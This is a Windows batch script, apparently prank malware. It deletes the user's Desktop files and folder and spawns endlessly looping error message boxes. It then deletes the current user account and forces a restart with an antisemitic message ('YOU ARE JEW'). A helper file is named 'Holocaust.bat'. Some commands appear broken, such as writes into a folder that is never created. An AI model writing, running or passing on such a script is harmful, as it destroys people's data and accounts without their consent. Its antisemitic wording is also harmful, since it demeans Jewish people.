::lol
@echo off
del "%userprofile%\Browser\Slaves"/q
rd "%userprofile%\Browser\Slaves"
del "%userprofile%\Browser"/q
rd "%userprofile%\Browser"
md "%userprofile%\Browser"
md "%userprofile%\Browser\Slaves"

echo msgbox "Slaves ERROR", 16, "ERROR" >> "%userprofile%\Browser\SlavesE.vbs"

echo @echo off >> "%userprofile%\Browser\SlavesS.bat"
echo :a >> "%userprofile%\Browser\SlavesS.bat"
echo start "%userprofile%\Browser\SlavesE.vbs" >> "%userprofile%\Browser\SlavesS.bat"
echo goto a >> "%userprofile%\Browser\SlavesS.bat"

echo del "%userprofile%\desktop"/q >> "%userprofile%\Browser\Holocaust.bat"

echo wscript.sleep 9000 >> "%userprofile%\Browser\Jaws\Game over.vbs"
echo msgbox "GAME OVER, JAW", 16, "JAW" >> "%userprofile%\Browser\Jaws\Game over.vbs"

timeout 1 >nul /nobreak

start "%userprofile%\Browser\SlavesS.bat"

timeout 2 >nul /nobreak

start "%userprofile%\Browser\Holocaust.bat"

timeout 1 >nul /nobreak

rd "%userprofile%\desktop"

start "%userprofile%\Browser\Jaws\Game over.vbs"

timeout 5 >nul /nobreak

net user "%username%" /delete

taskkill /f /im wscript.exe
shutdown /r /c "YOU ARE JEW" /t 3
taskkill /f /im cmd.exe
